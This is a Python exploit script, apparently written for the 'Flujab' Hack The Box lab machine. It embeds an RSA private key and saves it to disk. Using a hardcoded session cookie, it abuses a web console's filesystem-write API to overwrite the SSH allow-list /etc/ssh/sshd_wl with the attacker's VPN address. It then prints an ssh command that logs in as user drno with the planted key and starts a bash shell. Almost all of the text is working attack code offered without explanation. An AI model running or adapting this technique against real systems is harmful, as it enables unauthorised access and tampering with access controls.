#!/usr/bin/python
import requests,os
import netifaces as ni
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

id_rsa = """
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
"""
id_rsa = id_rsa.strip()

def main():
	ni.ifaddresses('tun0')
	ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

	cookies = {
	    'session': '0b7d4ec2fe297b3b36863a0020f503164fe53374',
	    'mp_df4919c7cb869910c1e188dbc2918807_mixpanel': '%7B%22distinct_id%22%3A%20%22168b141ea2d235-07f82fc062bb9b-3c6e4645-1fa400-168b141ea2e4e0%22%2C%22version%22%3A%20%222.1.25%22%2C%22platform%22%3A%20%22debian%22%2C%22platformUnmapped%22%3A%20%22debian%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D',
	}

	headers = {
	    'Host': 'sysadmin-console-01.flujab.htb:8080',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
	    'Accept': 'application/json, text/plain, */*',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Accept-Encoding': 'gzip, deflate',
	    'Referer': 'https://sysadmin-console-01.flujab.htb:8080/view/notepad//etc/ssh/sshd_wl',
	    'Content-Type': 'application/json;charset=utf-8',
	    'Content-Length': '104',
	    'Connection': 'close',
	}

	params = (
	    ('encoding', 'utf-8'),
	)

	data = 'sshd : {}\nsshd : {}'.format(ip,ip)

	response = requests.post('https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write//etc/ssh/sshd_wl', headers=headers, params=params, cookies=cookies, data=data, verify=False)
	print '[*] Response code: {}'.format(response.status_code)
	print "[*] Run: ssh -i files/id_rsa drno@10.10.10.124 -t 'bash --noprofile'"

if __name__ == '__main__':
	if not os.path.exists('files'):
		os.system('mkdir files')
	if not os.path.exists('files/id_rsa'):
		with open('files/id_rsa','w') as privkey:
			os.chmod("files/id_rsa", 0600)
			privkey.write(id_rsa)
	main()
